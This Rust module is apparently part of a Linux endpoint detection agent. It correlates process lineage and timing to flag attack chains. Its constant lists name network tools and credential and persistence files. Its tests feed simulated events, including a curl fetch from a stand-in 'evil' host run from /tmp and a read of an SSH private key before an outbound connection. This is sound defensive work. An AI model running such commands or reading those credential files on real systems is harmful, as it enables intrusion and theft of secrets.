//! Stateful IOA (Indicator-of-Attack) engine — correlation across the process
//! tree and time, the layer above the stateless per-event heuristics.
//!
//! The stateless [`super::behavior`] heuristics ask *"is this one event bad?"*.
//! Most steps of a real intrusion answer "no" individually — `curl` is normal,
//! `chmod +x` is normal, a shell under `sshd` is normal.  This engine asks the
//! question Falcon's IOAs are built on: *"do these events, **in this process
//! lineage**, **in this order**, **within this window**, form an attack?"*.
//!
//! Two pieces:
//!   * [`tree::ProcessTree`] — persistent PID→lineage state (with exec hashes),
//!     fed from the process-lifecycle events the collectors already emit.  It
//!     also **enriches every detection** with the accessor's process lineage.
//!   * [`chains::Correlator`] — sliding-window state machines, one declarative
//!     [`chains::ChainDef`] per attack pattern.
//!
//! It plugs into [`super::DetectionEngine`] behind a `Mutex`, exactly like the
//! beacon / netscan / dns trackers, and never blocks the consumer.

mod chains;
mod tree;

use std::time::Instant;

use crate::schema::{AgentEvent, DetectionData, EventData};

use chains::{Correlator, EventFacts};
use tree::ProcessTree;

/// Shells whose appearance can anchor an execution chain.
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish"];
/// Network download / transfer utilities frequently abused mid-chain.
const DOWNLOADERS: &[&str] = &["curl", "wget", "ftp", "tftp", "nc", "ncat", "socat"];
/// Directories an attacker drops and runs payloads from.
const TEMP_PREFIXES: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
/// Substrings that mark a credential store (kept in sync with the behavioural
/// heuristics, intentionally a small high-signal subset).
const CRED_MARKERS: &[&str] = &[
    "/etc/shadow",
    "/etc/gshadow",
    ".aws/credentials",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".kube/config",
    ".docker/config.json",
    ".gnupg/",
    ".netrc",
    ".git-credentials",
];
/// Substrings that mark an autostart / persistence location.
const PERSIST_MARKERS: &[&str] = &[
    "/etc/cron",
    "/var/spool/cron",
    "/etc/systemd/system",
    "/etc/init.d/",
    "/etc/rc.local",
    "/etc/profile.d/",
    ".bashrc",
    ".bash_profile",
    ".profile",
    "authorized_keys",
    "/etc/ld.so.preload",
];

/// Run periodic GC of the process tree every N observed events.
const GC_INTERVAL: u32 = 256;

/// Output of one [`IoaEngine::observe`] call.
#[derive(Default)]
pub struct IoaResult {
    /// Newly completed attack chains, as detection payloads.
    pub findings: Vec<DetectionData>,
    /// Process lineage of the event's acting pid (for enriching *other*
    /// detections raised on the same event).  JSON array, nearest-first.
    pub lineage: Option<serde_json::Value>,
}

/// The stateful IOA engine.  Holds the process tree and the chain correlator.
pub struct IoaEngine {
    tree:       ProcessTree,
    correlator: Correlator,
    enabled:    bool,
    counter:    u32,
}

impl IoaEngine {
    pub fn new() -> Self {
        let enabled = !env_off("TRAPD_IOA");
        let hash_executables = !env_off("TRAPD_IOA_HASH");
        Self {
            tree:       ProcessTree::new(hash_executables),
            correlator: Correlator::new(),
            enabled,
            counter:    0,
        }
    }

    /// Update state from one event and return any completed chains plus the
    /// acting process's lineage.  `now` is injectable for deterministic tests.
    pub fn observe(&mut self, event: &AgentEvent, now: Instant) -> IoaResult {
        if !self.enabled {
            return IoaResult::default();
        }

        // 1. Keep the process tree current from lifecycle events.
        self.update_tree(event, now);

        // 2. Classify this event once, then correlate.
        let facts = classify(event);
        let mut findings = Vec::new();
        for done in self.correlator.observe(&facts, &self.tree, now) {
            findings.push(self.chain_to_detection(&done));
        }

        // 3. Lineage for the acting pid, to enrich co-occurring detections.
        let lineage = facts.pid.and_then(|p| self.tree.lineage_json(p));

        // 4. Periodic maintenance.
        self.counter = self.counter.wrapping_add(1);
        if self.counter.is_multiple_of(GC_INTERVAL) {
            self.tree.gc(now);
        }

        IoaResult { findings, lineage }
    }

    fn update_tree(&mut self, event: &AgentEvent, now: Instant) {
        match &event.data {
            EventData::ProcessExec(p) => self.tree.on_exec(
                p.pid, p.ppid, p.uid, p.gid, &p.username, &p.comm, &p.exe, &p.cmdline, now,
            ),
            EventData::ProcessCreate(p) => self.tree.on_create(
                p.pid, p.ppid, p.uid, &p.username, &p.name, &p.exe, &p.cmdline, now,
            ),
            EventData::Fork(f) => {
                self.tree
                    .on_fork(f.parent_pid, f.child_pid, &f.parent_comm, &f.child_comm, now)
            }
            EventData::ProcessTerminate(t) => self.tree.on_exit(t.pid, now),
            _ => {}
        }
    }

    fn chain_to_detection(&self, c: &chains::CompletedChain) -> DetectionData {
        let def = c.def();
        let trail: Vec<serde_json::Value> = c
            .stages
            .iter()
            .map(|s| {
                serde_json::json!({
                    "stage":     s.stage,
                    "label":     s.label,
                    "pid":       s.pid,
                    "offset_ms": s.offset_ms as u64,
                })
            })
            .collect();
        let labels: Vec<&str> = def.stages.iter().map(|s| s.label).collect();

        let mut evidence = serde_json::json!({
            "chain":       labels,
            "stages":      trail,
            "anchor_pid":  c.anchor_pid,
            "final_pid":   c.final_pid,
            "duration_ms": c.duration_ms as u64,
        });
        if let Some(lin) = self.tree.lineage_json(c.final_pid) {
            evidence["process_lineage"] = lin;
        }

        DetectionData {
            rule_id:         def.id.into(),
            title:           def.title.into(),
            category:        def.category.into(),
            mitre_tactic:    Some(def.mitre_tactic.into()),
            mitre_technique: Some(def.mitre_technique.into()),
            confidence:      def.confidence,
            subject:         format!("pid {}", c.final_pid),
            detail:          format!(
                "{}: {} over {} ms ({} stages, anchored at pid {})",
                def.title,
                labels.join(" → "),
                c.duration_ms,
                c.stages.len(),
                c.anchor_pid,
            ),
            evidence,
        }
    }
}

impl Default for IoaEngine {
    fn default() -> Self {
        Self::new()
    }
}

/// Pre-classify one event into the cheap boolean facts the chains test against.
fn classify(event: &AgentEvent) -> EventFacts {
    let mut f = EventFacts::default();
    match &event.data {
        EventData::ProcessExec(p) => {
            f.pid = Some(p.pid);
            classify_process(&mut f, &p.comm, &p.exe, &p.cmdline, p.uid);
        }
        EventData::ProcessCreate(p) => {
            f.pid = Some(p.pid);
            classify_process(&mut f, &p.name, &p.exe, &p.cmdline, p.uid);
        }
        EventData::Setuid(s) => {
            f.pid = Some(s.pid);
            f.setuid_root = s.new_uid == 0 && s.old_uid != 0;
        }
        EventData::FileChmod(c) => {
            f.pid = Some(c.pid);
            f.made_executable = c.mode & 0o111 != 0;
        }
        EventData::FileOpen(o) => {
            f.pid = Some(o.pid);
            f.cred_access = path_has_marker(&o.path, CRED_MARKERS);
        }
        EventData::NetworkConnection(n) => {
            f.pid = n.pid;
            f.outbound_routable = super::is_routable(&n.dst_addr);
        }
        EventData::NetworkSocket(n) => {
            f.pid = Some(n.pid);
            f.outbound_routable = n.op == "connect" && super::is_routable(&n.addr);
        }
        _ => {}
    }
    f
}

fn classify_process(f: &mut EventFacts, comm: &str, exe: &str, cmdline: &str, uid: u32) {
    let base = basename(comm);
    let lower = cmdline.to_ascii_lowercase();
    f.is_shell_exec = SHELLS.contains(&base);
    f.is_downloader_exec = DOWNLOADERS.contains(&base);
    f.is_temp_exec = is_temp_path(exe);
    f.is_nonroot_proc = uid != 0;
    f.cred_access = path_has_marker(&lower, CRED_MARKERS);
    f.persistence_write = path_has_marker(&lower, PERSIST_MARKERS);
}

/// True if `exe` is a binary run from a world-writable / in-memory location.
fn is_temp_path(exe: &str) -> bool {
    TEMP_PREFIXES.iter().any(|p| exe.starts_with(p))
        || exe.starts_with("memfd:")
        || exe.contains("(deleted)")
}

fn path_has_marker(haystack: &str, markers: &[&str]) -> bool {
    markers.iter().any(|m| haystack.contains(m))
}

fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

/// A `TRAPD_*` env var is "off" when set to `0`/`false`/`no`/`off`.
fn env_off(key: &str) -> bool {
    std::env::var(key)
        .map(|v| matches!(v.trim().to_ascii_lowercase().as_str(), "0" | "false" | "no" | "off"))
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::{
        EventAction, EventClass, ExecEventData, NetworkConnectionData, Severity, SetuidData,
    };

    fn exec_event(pid: i32, ppid: i32, uid: u32, comm: &str, exe: &str, cmd: &str) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Exec,
            Severity::Info,
            EventData::ProcessExec(Box::new(ExecEventData {
                pid,
                ppid,
                uid,
                gid: uid,
                username: "u".into(),
                comm: comm.into(),
                exe: exe.into(),
                cmdline: cmd.into(),
                cwd: "/".into(),
                container_id: None,
                ld_preload: None,
                sha256: None,
                loaded_libraries: Vec::new(),
                env: Default::default(),
                interpreter: None,
                container_runtime: None,
                container_image: None,
                container_image_digest: None,
                k8s: None,
            })),
        )
    }

    fn setuid_event(pid: i32, old: u32, new: u32) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Setuid,
            Severity::Info,
            EventData::Setuid(SetuidData { pid, old_uid: old, new_uid: new, comm: "x".into() }),
        )
    }

    fn conn_event(pid: i32, ip: &str) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Network,
            EventAction::Connection,
            Severity::Info,
            EventData::NetworkConnection(NetworkConnectionData {
                protocol: "tcp".into(),
                src_addr: "10.0.0.2".into(),
                src_port: 5000,
                dst_addr: ip.into(),
                dst_port: 443,
                state: "established".into(),
                pid: Some(pid),
                process: None,
                duration_ms: None,
            }),
        )
    }

    #[test]
    fn end_to_end_download_and_execute_chain() {
        let mut e = IoaEngine::new();
        let t0 = Instant::now();
        // sshd → bash → curl → /tmp/payload, all in one lineage.
        e.observe(&exec_event(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd"), t0);
        e.observe(&exec_event(200, 100, 0, "bash", "/bin/bash", "bash -i"), t0);
        e.observe(
            &exec_event(300, 200, 0, "curl", "/usr/bin/curl", "curl http://evil/x -o /tmp/x"),
            t0,
        );
        let res = e.observe(
            &exec_event(301, 200, 0, "x", "/tmp/x", "/tmp/x"),
            t0,
        );
        assert_eq!(res.findings.len(), 1, "the staged chain should fire exactly once");
        let d = &res.findings[0];
        assert_eq!(d.rule_id, "ioa.download_and_execute");
        assert!(d.confidence >= 70);
        // The finding carries the full process lineage as evidence.
        assert!(d.evidence.get("process_lineage").is_some());
        assert!(d.evidence.get("stages").is_some());
    }

    #[test]
    fn privilege_escalation_chain() {
        let mut e = IoaEngine::new();
        let t0 = Instant::now();
        // non-root process gains root, then runs a dropped binary.
        e.observe(&exec_event(500, 1, 1000, "bash", "/bin/bash", "bash"), t0);
        e.observe(&setuid_event(500, 1000, 0), t0);
        let res = e.observe(&exec_event(501, 500, 0, "x", "/tmp/x", "/tmp/x"), t0);
        assert!(
            res.findings.iter().any(|d| d.rule_id == "ioa.privilege_escalation_activity"),
            "setuid(0) followed by a temp-dir exec should fire the privesc chain"
        );
    }

    #[test]
    fn credential_access_then_exfil_chain() {
        let mut e = IoaEngine::new();
        let t0 = Instant::now();
        // One shell session: `cat` reads an SSH key, a sibling `curl` connects
        // out. The two are tied together by their common bash ancestor.
        e.observe(&exec_event(600, 1, 0, "bash", "/bin/bash", "bash"), t0);
        e.observe(
            &exec_event(601, 600, 0, "cat", "/usr/bin/cat", "cat /home/u/.ssh/id_rsa"),
            t0,
        );
        e.observe(&exec_event(602, 600, 0, "curl", "/usr/bin/curl", "curl"), t0);
        let res = e.observe(&conn_event(602, "203.0.113.9"), t0);
        assert!(
            res.findings.iter().any(|d| d.rule_id == "ioa.credential_access_exfil"),
            "credential access followed by an outbound connection in the same \
             session should fire the exfil chain"
        );
    }

    #[test]
    fn benign_activity_is_quiet() {
        let mut e = IoaEngine::new();
        let t0 = Instant::now();
        e.observe(&exec_event(700, 1, 0, "bash", "/bin/bash", "bash"), t0);
        let res = e.observe(&exec_event(701, 700, 0, "ls", "/bin/ls", "ls -la"), t0);
        assert!(res.findings.is_empty(), "an ordinary shell + ls must not fire a chain");
    }

    #[test]
    fn disabled_via_env_is_inert() {
        // Construct directly with enabled=false to avoid global env races.
        let mut e = IoaEngine {
            tree: ProcessTree::new(false),
            correlator: Correlator::new(),
            enabled: false,
            counter: 0,
        };
        let t0 = Instant::now();
        let res = e.observe(&exec_event(800, 1, 0, "bash", "/bin/bash", "bash"), t0);
        assert!(res.findings.is_empty());
        assert!(res.lineage.is_none());
    }
}
